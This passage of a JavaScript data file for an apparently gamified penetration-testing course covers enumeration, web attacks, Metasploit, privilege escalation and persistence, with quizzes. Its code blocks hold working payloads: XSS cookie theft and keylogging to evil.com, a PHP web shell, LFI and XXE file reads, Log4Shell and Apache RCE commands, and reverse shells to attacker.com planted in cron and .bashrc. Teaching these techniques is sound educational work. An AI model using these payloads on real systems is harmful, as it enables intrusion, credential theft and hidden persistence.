          {t:"code", v:"# ── SMB ENUMERATION (port 445) ──────────────────────\nsmbclient -L //TARGET -N           # List shares (no auth)\nsmbclient //TARGET/share -N        # Connect to share\nsmbenum TARGET                     # Automated enum\ncrackmap exec TARGET               # Swiss army knife for SMB\ncrackmap exec TARGET -u '' -p ''   # Null session\ncrackmap exec TARGET --shares      # List shares\ncrackmap exec TARGET -u users.txt -p passwords.txt  # Spray!\n\n# ── FTP ENUMERATION (port 21) ───────────────────────\nftp TARGET                         # Connect\nnmap --script ftp-anon TARGET      # Check anon login\nnmap --script ftp-bounce TARGET    # FTP bounce attack\n\n# ── SSH ENUMERATION (port 22) ───────────────────────\nssh -V                             # Version check\nnmap --script ssh-auth-methods TARGET\nnmap --script ssh-hostkey TARGET\n\n# ── SNMP ENUMERATION (port 161 UDP) ─────────────────\nonesixtyone -c community.txt TARGET  # Community string brute\nsnmpwalk -v2c -c public TARGET       # Full SNMP walk\n# Finds: users, processes, network config, routing tables"},
          {t:"code", v:"# ── WEB ENUMERATION ──────────────────────────────────\n# Interesting files to always check:\nhttp://TARGET/robots.txt         # Hidden paths!\nhttp://TARGET/.htaccess          # Web config\nhttp://TARGET/sitemap.xml        # All pages\nhttp://TARGET/crossdomain.xml    # Flash policy\nhttp://TARGET/phpinfo.php        # PHP info = GOLDMINE\nhttp://TARGET/server-status      # Apache status\nhttp://TARGET/admin              # Admin panel\nhttp://TARGET/backup/            # Backup files!\nhttp://TARGET/config.php.bak     # Config backup!\nhttp://TARGET/.git/              # Exposed git repo! (dump it!)"},
        ],
        quiz:[
          {q:"smbclient -L //TARGET -N lists?",a:["SMB version","SMB shares (null session)","SMB users","SMB logs"],c:1},
          {q:"SNMP runs on which port/protocol?",a:["80 TCP","443 TCP","161 UDP","22 TCP"],c:2},
          {q:"robots.txt on a web server contains?",a:["Robot detection","URLs the admin doesn't want indexed","Passwords","Server version"],c:1},
          {q:"CrackMapExec is used for?",a:["Email cracking","SMB/AD enumeration and attacks","Port scanning","Web fuzzing"],c:1},
          {q:"Exposed .git directory allows?",a:["Git attacks only","Dumping full source code of the application","DNS attacks","SSH access"],c:1},
        ]
      },
      { id:"m5l2", title:"Vulnerability Scanning — Nessus & OpenVAS", xp:80,
        content:[
          {t:"h", v:"// VULNERABILITY SCANNING: FIND FLAWS AT SCALE"},
          {t:"p", v:"Vulnerability scanners automate the discovery of known CVEs across many hosts simultaneously. Essential for large-scope pentests and compliance assessments."},
          {t:"code", v:"# ── NESSUS (Industry Standard) ──────────────────────\n# Setup on Kali:\napt install nessus\n/etc/init.d/nessusd start\nbrowser → https://localhost:8834\n# Register free at: https://www.tenable.com/products/nessus/nessus-essentials\n\n# ── OPENVAS (Free Alternative) ───────────────────────\napt install openvas\nopenvas-setup\ngvm-start\nbrowser → https://127.0.0.1:9392\n\n# ── NMAP SCRIPT SCANNING ──────────────────────────────\nnmap --script vuln TARGET\nnmap --script=exploit TARGET  # Try known exploits!\nnmap --script smb-vuln-ms17-010 TARGET  # EternalBlue check!\nnmap --script http-sql-injection TARGET  # SQLi check\n\n# ── NUCLEI (Fast modern scanner) ─────────────────────\nnuclei -u https://target.com -t cves/\nnuclei -u https://target.com -t vulnerabilities/\nnuclei -l urls.txt -t exposures/  # Scan URL list"},
          {t:"tip", v:"Always save scan results! Use: nmap -oA scan_name or nikto -o results.html. Your report depends on this data."},
        ],
        quiz:[
          {q:"Nessus is primarily a?",a:["Port scanner","Vulnerability scanner","Password cracker","Exploit framework"],c:1},
          {q:"CVE stands for?",a:["Common Vulnerability Exposure","Common Vulnerabilities and Exposures","Critical Vulnerability Engine","Cyber Vulnerability Entry"],c:1},
          {q:"nmap --script smb-vuln-ms17-010 checks for?",a:["SMB auth bypass","EternalBlue vulnerability","SMB null sessions","SMB shares"],c:1},
          {q:"Nuclei templates are used for?",a:["Template-based vulnerability scanning","Network mapping","Password generation","SQL injection"],c:0},
          {q:"CVSS score of 10.0 means?",a:["Low risk","Medium risk","High risk","Critical — most severe"],c:3},
        ]
      },
      { id:"m5l3", title:"CVE Research & Exploit Finding", xp:90,
        content:[
          {t:"h", v:"// CVE RESEARCH: FIND WEAPONS FOR YOUR TARGET"},
          {t:"p", v:"Every version of every software has known CVEs. After enumeration, you research if your target runs vulnerable versions — then find or adapt existing exploits."},
          {t:"code", v:"# ── KEY DATABASES ────────────────────────────────────\nhttps://nvd.nist.gov           # National Vulnerability DB\nhttps://cve.mitre.org          # Official CVE list\nhttps://www.exploit-db.com     # Exploit database\nhttps://www.cvedetails.com     # CVE details + metrics\nhttps://packetstormsecurity.com # More exploits\n\n# ── SEARCHSPLOIT (Offline exploit-db) ───────────────\nsearchsploit apache 2.4.49    # Find exploits for version\nsearchsploit -m 50383          # Copy exploit to current dir\nsearchsploit windows smb       # Browse category\nsearchsploit --www apache      # Open in browser\n\n# ── EXAMPLE CVE RESEARCH WORKFLOW ────────────────────\n# Step 1: Nmap shows Apache 2.4.49\n# Step 2: searchsploit apache 2.4.49\n# → Shows: Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)\n# Step 3: Read exploit, adapt, test in lab\n# Step 4: Exploit in authorized target"},
          {t:"code", v:"# ── FAMOUS CVEs EVERY HACKER KNOWS ─────────────────\nCVE-2017-0144  EternalBlue (SMB)         → MS17-010\nCVE-2021-44228 Log4Shell (Log4j)         → RCE in Java\nCVE-2021-41773 Apache Path Traversal     → RCE\nCVE-2019-0708  BlueKeep (RDP)            → Pre-auth RCE\nCVE-2020-1472  Zerologon (Netlogon)      → AD domain takeover!\nCVE-2022-26134 Atlassian Confluence      → RCE\nCVE-2023-44487 HTTP/2 Rapid Reset        → DDoS\nCVE-2014-0160  Heartbleed (OpenSSL)      → Memory leak"},
        ],
        quiz:[
          {q:"searchsploit is used to?",a:["Search Shodan","Search offline copy of exploit-db","Search CVE details","Search Nmap scripts"],c:1},
          {q:"EternalBlue CVE number?",a:["CVE-2017-0145","CVE-2017-0144","CVE-2019-0708","CVE-2021-44228"],c:1},
          {q:"Log4Shell affects?",a:["Apache web server","Log4j Java logging library","Microsoft Windows","OpenSSL"],c:1},
          {q:"exploit-db.com is maintained by?",a:["NIST","MITRE","Offensive Security","Microsoft"],c:2},
          {q:"searchsploit -m 50383 does?",a:["Search for exploit 50383","Mirror/copy exploit to current dir","Delete exploit","List exploit metadata"],c:1},
        ]
      },
    ],
    test:[
      {q:"SNMP uses which transport protocol?",a:["TCP","UDP","ICMP","HTTP"],c:1},
      {q:"CVE stands for?",a:["Common Vulnerability Exposure","Common Vulnerabilities and Exposures","Critical Vuln Engine","Cyber Vuln Entry"],c:1},
      {q:"searchsploit searches?",a:["Shodan database","Offline exploit-db copy","NVD database","Metasploit modules"],c:1},
      {q:"robots.txt contains?",a:["Robot passwords","Paths admin doesn't want indexed","Server version","Firewall rules"],c:1},
      {q:"Nessus is used for?",a:["Network mapping","Vulnerability scanning","Password cracking","Exploit development"],c:1},
      {q:"EternalBlue exploits which service?",a:["FTP","SSH","SMB MS17-010","HTTP"],c:2},
      {q:"CrackMapExec is a tool for?",a:["Email cracking","SMB/AD enumeration","Port scanning","Web fuzzing"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 6 — WEB APPLICATION HACKING
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m6", title:"Web Application Hacking", emoji:"🕷️",
    color:"#ff3333", xp:1000, desc:"OWASP Top 10, SQLi, XSS, Burp Suite & more",
    lessons:[
      { id:"m6l1", title:"OWASP Top 10 & Burp Suite Setup", xp:90,
        content:[
          {t:"h", v:"// OWASP TOP 10: THE WEB HACKER'S BIBLE"},
          {t:"p", v:"OWASP documents the 10 most critical web vulnerabilities. Every web pentest is essentially a systematic check for these categories."},
          {t:"list", v:["A01 Broken Access Control — Users access unauthorized functions/data","A02 Cryptographic Failures — Sensitive data exposed via weak/no encryption","A03 Injection — SQLi, Command Injection, XSS, LDAP Injection","A04 Insecure Design — Architectural/design-level flaws","A05 Security Misconfiguration — Default creds, exposed admin, error pages","A06 Vulnerable & Outdated Components — Unpatched libraries/frameworks","A07 Authentication Failures — Weak passwords, broken session management","A08 Software/Data Integrity Failures — Untrusted updates/deserialization","A09 Security Logging Failures — Can't detect/respond to attacks","A10 SSRF — Server makes requests to internal/external resources"]},
          {t:"code", v:"# ── BURP SUITE SETUP ─────────────────────────────────\n# 1. Open Burp Suite Community (free)\n# 2. Proxy → Options → Add listener: 127.0.0.1:8080\n# 3. Browser → Proxy settings → Manual: 127.0.0.1:8080\n# 4. Install Burp CA cert in browser\n# 5. Intercept is ON → browse target → modify requests!\n\n# Key Burp tabs:\n# Proxy → Intercept/modify live traffic\n# Repeater → Replay modified requests  \n# Intruder → Automated attack (fuzzing, brute force)\n# Scanner → Find vulnerabilities automatically (Pro only)\n# Decoder → Encode/decode base64, URL, HTML\n# Comparer → Diff two responses"},
        ],
        quiz:[
          {q:"OWASP stands for?",a:["Online Web Attack Security Protocol","Open Web Application Security Project","Official Website Attack Standard","Organized Web App Security"],c:1},
          {q:"SQL Injection falls under OWASP category?",a:["A01 Broken Access","A02 Crypto Failures","A03 Injection","A07 Auth Failures"],c:2},
          {q:"Default credentials is example of?",a:["A03 Injection","A05 Security Misconfiguration","A01 Broken Access","A10 SSRF"],c:1},
          {q:"Burp Suite Repeater is used for?",a:["Automated scanning","Manually replaying/modifying HTTP requests","Decoding data","Intercepting traffic"],c:1},
          {q:"SSRF allows attacker to?",a:["Inject SQL","Make server perform requests to internal/external URLs","Run JavaScript","Upload files"],c:1},
        ]
      },
      { id:"m6l2", title:"SQL Injection — Complete Guide", xp:120,
        content:[
          {t:"h", v:"// SQL INJECTION: DATABASE DOMINATION"},
          {t:"p", v:"SQLi is the #1 most dangerous web vulnerability when found. Can dump entire databases, bypass authentication, read server files, and even achieve OS code execution."},
          {t:"code", v:"# ── DETECTION ─────────────────────────────────────────\n'                         # Single quote — causes DB error\n''                        # Double quote\n1'                        # Number + quote\n1 OR 1=1                  # Boolean test\n1' OR '1'='1              # String comparison bypass\n1; SELECT sleep(5)--      # Time-based blind test\n\n# ── AUTHENTICATION BYPASS ─────────────────────────────\n# Input: admin'--  (password field anything)\n# Query: SELECT * FROM users WHERE user='admin'--' AND pass='...'\n# '--' comments out password check → LOGIN BYPASSED!\n\n# Other auth bypass payloads:\nadmin'--\nadmin'/*\n' OR 1=1--\n' OR '1'='1'--\n1' OR 1=1#  (MySQL uses # too)"},
          {t:"code", v:"# ── UNION-BASED (extract data) ───────────────────────\n# Step 1: Find number of columns:\n' ORDER BY 1--   ← no error\n' ORDER BY 2--   ← no error  \n' ORDER BY 3--   ← ERROR! → 2 columns\n\n# Step 2: Find displayable column:\n' UNION SELECT 1,2--\n\n# Step 3: Extract data:\n' UNION SELECT table_name,2 FROM information_schema.tables--\n' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT username,password FROM users--\n\n# ── SQLMAP (AUTOMATED) ────────────────────────────────\nsqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D targetdb --tables\nsqlmap -u 'http://target.com/page?id=1' -D targetdb -T users --dump\nsqlmap -u 'http://target.com/page?id=1' --os-shell  # Shell!\n# With Burp request:\nsqlmap -r burp_request.txt --dbs"},
          {t:"warn", v:"⚠️ PRACTICE ONLY on: DVWA, SQLi-Labs, PortSwigger Web Academy, HackTheBox, TryHackMe. NEVER on unauthorized sites!"},
        ],
        quiz:[
          {q:"' OR '1'='1 in login form does?",a:["Creates new user","Bypasses authentication","Deletes database","Encrypts traffic"],c:1},
          {q:"In SQL, -- is used for?",a:["Subtraction","Commenting out rest of query","String concatenation","Division"],c:1},
          {q:"sqlmap --os-shell tries to get?",a:["Database shell","Operating system command shell","SQLite shell","SSH shell"],c:1},
          {q:"UNION-based SQLi is used for?",a:["Auth bypass","Extracting data from other DB tables","Deleting tables","Creating admin"],c:1},
          {q:"information_schema.tables contains?",a:["User passwords","All database and table names","Config files","System logs"],c:1},
        ]
      },
      { id:"m6l3", title:"XSS, CSRF, SSRF & File Upload Attacks", xp:130,
        content:[
          {t:"h", v:"// XSS / CSRF / SSRF / FILE UPLOAD ATTACKS"},
          {t:"p", v:"Master these four attack categories and you can attack nearly any web application. Each exploits different trust relationships."},
          {t:"code", v:"# ── XSS (Cross-Site Scripting) ───────────────────────\n# Types:\n# 1. Reflected — payload in URL/request, executes once\n# 2. Stored (Persistent) — saved in DB, hits ALL users!\n# 3. DOM-based — client-side JS manipulation\n\n# Basic test payloads:\n<script>alert(1)</script>\n<img src=x onerror=alert(document.domain)>\n<svg onload=alert(1)>\n<iframe src=javascript:alert(1)>\n\n# Cookie theft (stored XSS → steal all sessions!):\n<script>new Image().src='http://evil.com/?c='+document.cookie</script>\n\n# XSS → Keylogger:\n<script>\ndocument.onkeypress=function(e){new Image().src='http://evil.com/?k='+e.key}\n</script>"},
          {t:"code", v:"# ── CSRF (Cross-Site Request Forgery) ────────────────\n# Tricks victim's browser to make unauthorized requests\n# Victim is logged in → attacker page forces action\n<img src='http://bank.com/transfer?to=attacker&amount=50000'>\n# Prevention: CSRF tokens in every state-changing form\n\n# ── SSRF (Server-Side Request Forgery) ───────────────\n# Server fetches URL we control → access internal services!\n# Payload examples:\nhttp://localhost/admin           # Internal admin panel!\nhttp://169.254.169.254/latest/meta-data/  # AWS metadata!\nhttp://192.168.1.1/admin         # Internal router!\nfile:///etc/passwd               # Local file read!\n\n# ── FILE UPLOAD VULNERABILITIES ──────────────────────\n# Bypass restrictions:\n# 1. Change extension: shell.php.jpg or shell.pHp\n# 2. Change MIME type in Burp: image/jpeg → then upload .php\n# 3. NULL byte: shell.php%00.jpg (older PHP)\n# Web shell content:\n<?php system($_GET['cmd']); ?>    # Simple PHP webshell\n# Access: http://target.com/uploads/shell.php?cmd=id"},
          {t:"tip", v:"PortSwigger Web Security Academy (portswigger.net/web-security) has FREE labs for every web vulnerability. Work through them all!"},
        ],
        quiz:[
          {q:"Stored XSS is more dangerous because?",a:["Harder to code","It affects ALL users who visit the page","Requires root access","Requires SQLi"],c:1},
          {q:"XSS can be used to steal?",a:["Server files directly","Session cookies and tokens","Crash the web server","Read database directly"],c:1},
          {q:"CSRF attack exploits?",a:["SQL vulnerabilities","Browser trust — victim's authenticated session","Server-side code","File upload functions"],c:1},
          {q:"SSRF accessing http://169.254.169.254 targets?",a:["Router","AWS/cloud metadata service","Internal DNS","Admin panel"],c:1},
          {q:"<?php system($_GET['cmd']); ?> is a?",a:["XSS payload","SQL injection","PHP web shell for RCE","CSRF token"],c:2},
        ]
      },
      { id:"m6l4", title:"LFI, RFI, XXE & Directory Traversal", xp:110,
        content:[
          {t:"h", v:"// LFI/RFI/XXE/TRAVERSAL: DEEPER WEB ATTACKS"},
          {t:"code", v:"# ── LOCAL FILE INCLUSION (LFI) ───────────────────────\n# Vulnerable URL: http://target.com/page.php?file=about\n# Test payload:\nhttp://target.com/page.php?file=../../etc/passwd\nhttp://target.com/page.php?file=../../../../etc/shadow\nhttp://target.com/page.php?file=/var/log/apache2/access.log  # Log poisoning!\n\n# PHP wrappers (POWERFUL!):\nhttp://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php\n# → Base64 encoded source code! Decode it!\nbase64 -d <<< 'encoded_string'\n\n# ── REMOTE FILE INCLUSION (RFI) ──────────────────────\n# PHP allow_url_include = On (misconfiguration)\n# Host malicious PHP on your server:\nhttp://target.com/page.php?file=http://evil.com/shell.txt\n\n# ── PATH TRAVERSAL ────────────────────────────────────\n# Bypass filters:\n..././..././etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....//....//etc/passwd\n\n# ── XXE (XML External Entity Injection) ──────────────\n# Vulnerable app processes XML input:\n<?xml version='1.0'?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n<root><data>&xxe;</data></root>\n# → Server returns /etc/passwd content!"},
          {t:"warn", v:"⚠️ Always verify you have authorization! LFI can expose /etc/shadow and SSH private keys — extremely sensitive data."},
        ],
        quiz:[
          {q:"LFI stands for?",a:["Linux File Injection","Local File Inclusion","Large File Integrity","Literal Format Input"],c:1},
          {q:"LFI payload ../../etc/passwd does?",a:["Delete passwd file","Read the system password file","Write to passwd file","Execute passwd binary"],c:1},
          {q:"XXE injection exploits?",a:["SQL databases","XML parser external entity processing","XSS reflection","CSRF tokens"],c:1},
          {q:"PHP filter wrapper php://filter is used for?",a:["Execute PHP code","Read source code of PHP files in base64","Include remote files","Bypass CSRF"],c:1},
          {q:"RFI requires what PHP setting to be enabled?",a:["allow_url_fopen","allow_url_include","file_get_contents","include_path"],c:1},
        ]
      },
    ],
    test:[
      {q:"OWASP A01 (2021) is?",a:["Injection","XSS","Broken Access Control","Crypto Failures"],c:2},
      {q:"SQLmap --dump flag does?",a:["Delete data","Dump/extract table data","Compress data","Dump network packets"],c:1},
      {q:"XSS stands for?",a:["Extra Security Script","Cross-Site Scripting","External Script Security","Cross-Server Session"],c:1},
      {q:"SQL comment character (MySQL)?",a:["#  or --","//","/*  only","=="],c:0},
      {q:"LFI path ../../etc/passwd accesses?",a:["Remote file","Local /etc/passwd","FTP file","Database"],c:1},
      {q:"Stored XSS payload stored in?",a:["URL","Browser cache","Database (persists for all users)","Server memory"],c:2},
      {q:"PHP web shell <?php system($_GET['cmd']); ?> does?",a:["SQL injection","XSS attack","OS command execution","File upload"],c:2},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 7 — EXPLOITATION
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m7", title:"Exploitation", emoji:"💥",
    color:"#ff0055", xp:1000, desc:"Metasploit, manual exploits & buffer overflows",
    lessons:[
      { id:"m7l1", title:"Metasploit Framework — Complete Guide", xp:130,
        content:[
          {t:"h", v:"// METASPLOIT: THE WORLD'S MOST POWERFUL EXPLOIT FRAMEWORK"},
          {t:"p", v:"Metasploit Framework (MSF) contains 2000+ exploits, 1000+ payloads, and hundreds of post-exploitation modules. Understanding it deeply is mandatory for every ethical hacker."},
          {t:"code", v:"# ── LAUNCH & BASICS ───────────────────────────────────\nmsfconsole                        # Launch Metasploit\nhelp                              # Show all commands\nsearch eternalblue                # Search exploits\nsearch type:exploit platform:windows  # Filter search\ninfo exploit/windows/smb/ms17_010_eternalblue  # Module info\n\n# ── USING AN EXPLOIT ──────────────────────────────────\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options                      # Show required settings\nset RHOSTS 10.10.10.40           # Target IP(s)\nset LHOST 10.10.14.10            # Your IP (tun0 for HTB/THM)\nset LPORT 4444                   # Listener port\nshow payloads                    # Available payloads\nset payload windows/x64/meterpreter/reverse_tcp\ncheck                            # Check if target vulnerable (if supported)\nrun                              # Launch exploit!\nexploit -j                       # Run in background"},
          {t:"code", v:"# ── METERPRETER (POST-EXPLOITATION) ─────────────────\nsessions                         # List active sessions\nsessions -i 1                   # Interact with session 1\n\n# System info:\nsysinfo                          # OS, hostname, arch\ngetuid                           # Current user\ngetpid                           # Process ID\n\n# Privilege escalation:\ngetsystem                        # Attempt auto-privesc\nrun post/multi/recon/local_exploit_suggester  # Find privesc\n\n# Credentials:\nhashdump                         # Dump NTLM hashes!\nrun post/windows/gather/credentials/credential_collector\n\n# Movement:\nshell                            # Drop to OS shell\nupload /local/file /remote/path  # Upload file\ndownload /remote/file            # Download file\nportfwd add -l 3306 -p 3306 -r TARGET  # Port forwarding!\n\n# Persistence:\nrun post/windows/manage/persistence_exe"},
          {t:"warn", v:"💀 Metasploit ONLY on authorized targets! This is a federal crime without permission in most countries."},
        ],
        quiz:[
          {q:"Launch Metasploit with?",a:["msfstart","metasploit --start","msfconsole","msf -launch"],c:2},
          {q:"RHOSTS in Metasploit means?",a:["Your IP","Target IP(s)","Router IP","Remote hostname"],c:1},
          {q:"Meterpreter hashdump dumps?",a:["File hashes","NTLM password hashes from SAM database","Memory dump","MD5 hashes"],c:1},
          {q:"sessions -i 1 does?",a:["Kill session 1","Interact with session 1","List sessions","Info on session 1"],c:1},
          {q:"LHOST should be set to?",a:["Target IP","Your VPN/listener IP (tun0)","Gateway IP","DNS server"],c:1},
        ]
      },
      { id:"m7l2", title:"Manual Exploitation & Exploit Development Basics", xp:120,
        content:[
          {t:"h", v:"// MANUAL EXPLOITATION: BEYOND METASPLOIT"},
          {t:"p", v:"Tools fail. Networks block them. Custom exploits get detected. Knowing how to exploit manually — and adapt public PoCs — is what separates real hackers from tool runners."},
          {t:"code", v:"# ── USING SEARCHSPLOIT EXPLOITS MANUALLY ─────────────\nsearchsploit apache 2.4.49\n# Found: Apache 2.4.49 Path Traversal/RCE\nsearchsploit -m 50383            # Copy exploit\npython3 50383.py http://TARGET   # Run it!\n\n# ── MANUAL CVE-2021-41773 (Apache RCE) ───────────────\ncurl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'\n# RCE:\ncurl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \\\n  --data 'echo Content-Type: text/plain; echo; id'\n\n# ── MANUAL LOG4SHELL (CVE-2021-44228) ─────────────────\n# Any field processed by Log4j:\ncurl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://TARGET/\ncurl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://TARGET/\n\n# ── BUFFER OVERFLOW BASICS (Stack) ────────────────────\n# Concept: overwrite instruction pointer (EIP/RIP)\n# Tools: GDB + pwndbg/peda, pwntools, radare2\n\n# Simple BoF Python skeleton:\npython3 -c \"print('A'*1000)\" | ./vulnerable_binary\n# → If crash → find offset with pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000\n# → Find EIP offset → overwrite with shellcode address"},
          {t:"tip", v:"Practice buffer overflows on TryHackMe 'Buffer Overflow Prep' room and vulnserver.exe in Windows VMs."},
        ],
        quiz:[
          {q:"searchsploit -m 50383 does?",a:["Search for ID 50383","Mirror/copy exploit 50383 to cwd","Delete exploit","Run exploit"],c:1},
          {q:"Buffer overflow overflows?",a:["RAM","Network buffer","Stack buffer to overwrite return address","Hard disk"],c:2},
          {q:"EIP register stores?",a:["Data","Stack pointer","Instruction pointer (next instruction address)","Base pointer"],c:2},
          {q:"pwntools is used for?",a:["Port scanning","Exploit scripting in Python","Password cracking","Web hacking"],c:1},
          {q:"Log4Shell exploits?",a:["Apache HTTP Server","Apache Log4j JNDI lookup","MySQL","PHP"],c:1},
        ]
      },
    ],
    test:[
      {q:"LHOST in MSF =?",a:["Target IP","Your attacker IP","Router IP","Localhost"],c:1},
      {q:"Meterpreter getsystem tries?",a:["Get system info","Privilege escalation to SYSTEM","Get all systems","Get OS version"],c:1},
      {q:"hashdump dumps?",a:["File hashes","NTLM SAM hashes","Memory","MD5 only"],c:1},
      {q:"searchsploit -m copies?",a:["Module to MSF","Exploit to current directory","Man page","Metasploit db"],c:1},
      {q:"Buffer overflow overwrites?",a:["RAM modules","Return address/EIP","Network buffer","Disk buffer"],c:1},
      {q:"EternalBlue targets?",a:["FTP 21","SSH 22","SMB 445 MS17-010","RDP 3389"],c:2},
      {q:"portfwd in Meterpreter does?",a:["Opens new session","Port forwarding through compromised host","Downloads files","Kills firewall"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 8 — POST EXPLOITATION
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m8", title:"Post Exploitation", emoji:"🏠",
    color:"#9b59b6", xp:900, desc:"Persistence, lateral movement & data exfiltration",
    lessons:[
      { id:"m8l1", title:"Privilege Escalation — Linux & Windows", xp:120,
        content:[
          {t:"h", v:"// PRIVILEGE ESCALATION: FROM USER TO GOD"},
          {t:"p", v:"Getting initial access is only step one. PrivEsc gets you SYSTEM/root — full control. This is the most creative and rewarding phase of hacking."},
          {t:"code", v:"# ── LINUX PRIVESC ─────────────────────────────────────\n# Automated enum:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash\nwget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh\nbash lse.sh -l 1\n\n# Key checks:\nsudo -l                               # Sudo rights!\nfind / -perm -4000 2>/dev/null        # SUID bins!\ncat /etc/crontab && ls -la /etc/cron* # Cron jobs!\nenv && cat ~/.bashrc                  # Env variables, history\ncat /proc/1/status                   # Running as root?\nls -la /etc/passwd /etc/shadow        # Writable?\nuname -a && lsb_release -a            # OS version → kernel exploits?"},
          {t:"code", v:"# ── WINDOWS PRIVESC ───────────────────────────────────\n# Automated enum:\n.\\winpeas.exe\n.\\PowerUp.ps1; Invoke-AllChecks\nGet-LocalGroupMember Administrators   # Who's admin?\n\n# Key checks:\nnet user                              # All local users\nnet localgroup administrators         # Admin group\nwhoami /priv                          # Current privileges (SeDebugPrivilege!)\nqwinsta                               # Logged-on users\nsysinfo | findstr /i 'os version'     # OS for kernel exploits\nsc query state= all                   # All services\n\n# Common Windows privesc:\n# 1. SeImpersonatePrivilege → JuicyPotato / PrintSpoofer\n# 2. Unquoted service paths\n# 3. Weak service permissions\n# 4. AlwaysInstallElevated registry\n# 5. Stored credentials: cmdkey /list\n# 6. Kerberoasting (AD environments)"},
        ],
        quiz:[
          {q:"linpeas.sh is run to?",a:["Scan network","Automatically enumerate Linux privesc vectors","Crack passwords","Scan web apps"],c:1},
          {q:"GTFObins is used for?",a:["Bug reports","SUID/sudo binary exploitation for privesc","Web fuzzing","Generating payloads"],c:1},
          {q:"SeImpersonatePrivilege on Windows enables?",a:["File reading","Potato attacks for SYSTEM privesc","Network scanning","Password dumping"],c:1},
          {q:"Unquoted service path vulnerability exists when?",a:["Service has no password","Service binary path has spaces without quotes","Service runs as admin","Service is disabled"],c:1},
          {q:"WinPEAS is to Windows as ___ is to Linux?",a:["Metasploit","linpeas.sh","sqlmap","nmap"],c:1},
        ]
      },
      { id:"m8l2", title:"Persistence & Lateral Movement", xp:110,
        content:[
          {t:"h", v:"// PERSISTENCE & LATERAL MOVEMENT"},
          {t:"p", v:"Persistence = stay after reboot. Lateral movement = spread to other machines. These are advanced post-exploitation techniques used in real APT attacks."},
          {t:"code", v:"# ── PERSISTENCE TECHNIQUES ────────────────────────────\n# Linux:\ncrontab -e\n# Add: @reboot nc -e /bin/bash attacker.com 4444\necho 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bashrc\ncat 'ssh-rsa YOURKEY' >> ~/.ssh/authorized_keys\n\n# Windows:\nreg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \\\\\n  /v payload /t REG_SZ /d \"C:\\\\payload.exe\"\nschtasks /create /tn backdoor /tr C:\\\\shell.exe /sc onstart\n\n# Meterpreter:\nrun post/windows/manage/persistence_exe\nrun post/linux/manage/cron_persistence\n\n# ── LATERAL MOVEMENT ──────────────────────────────────\n# Pass the Hash (PtH) — use NTLM hash without knowing password:\ncrackmap exec 10.10.10.0/24 -u admin -H 'NTLM_HASH' --local-auth\npsexec.py 'DOMAIN/admin@TARGET' -hashes ':NTLM_HASH'\n\n# Pass the Ticket (Kerberos) — Golden/Silver tickets\n# Pivoting through compromised host:\nssh -D 1080 user@PIVOT_HOST    # SOCKS proxy!\nproxychains nmap -sT -Pn INTERNAL_TARGET"},
          {t:"tip", v:"In red team ops, persistence + lateral movement = 'living off the land'. Use built-in tools (PowerShell, WMI, certutil) to blend in with normal traffic."},
        ],
        quiz:[
          {q:"Pass the Hash attack uses?",a:["Plaintext password","NTLM hash directly (no cracking needed)","Kerberos ticket","SSL certificate"],c:1},
          {q:"Pivoting allows you to?",a:["Escalate privileges","Access internal networks through compromised host","Bypass WAF","Delete logs"],c:1},
          {q:"SSH -D 1080 creates a?",a:["Direct shell","SOCKS proxy for pivoting","Port forward to 1080","Reverse shell"],c:1},
          {q:"Golden Ticket attack targets?",a:["Web applications","Kerberos TGT — allows impersonating any domain user","FTP servers","SSH servers"],c:1},
          {q:"HKLM\\Run registry key is used for?",a:["Hardware management","Windows autorun persistence","Network config","Log storage"],c:1},
        ]
      },
    ],
    test:[
      {q:"linpeas automates?",a:["Network scan","Linux privesc enumeration","Password cracking","Web exploitation"],c:1},
      {q:"Pass the Hash bypasses need for?",a:["NTLM hash","Plaintext password (uses hash directly)","Kerberos","SMB"],c:1},
      {q:"Crontab -e is used for?",a:["System config","Scheduling cron jobs (persistence!)","User management","Network config"],c:1},
      {q:"SeImpersonatePrivilege → ?",a:["File read","Potato attacks → SYSTEM","Network access","Registry edit"],c:1},
      {q:"Pivoting means?",a:["Rotating passwords","Routing traffic through compromised host","Moving files","Deleting logs"],c:1},
      {q:"authorized_keys file enables?",a:["Password change","Passwordless SSH access (backdoor!)","Key generation","Network access"],c:1},
      {q:"psexec.py from Impacket is used for?",a:["SQL injection","Remote code execution via SMB","Port scanning","DNS attacks"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 9 — PASSWORD ATTACKS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m9", title:"Password Attacks", emoji:"🔑",
    color:"#e67e22", xp:800, desc:"Hash cracking, brute force, wordlists & credential attacks",
    lessons:[
      { id:"m9l1", title:"Password Cracking with Hashcat & John", xp:100,
        content:[
          {t:"h", v:"// PASSWORD CRACKING: TURN HASHES INTO PASSWORDS"},
          {t:"p", v:"Dumped hashes are useless until cracked. Hashcat is the fastest GPU-powered cracker. John the Ripper is CPU-based and flexible. Master both."},
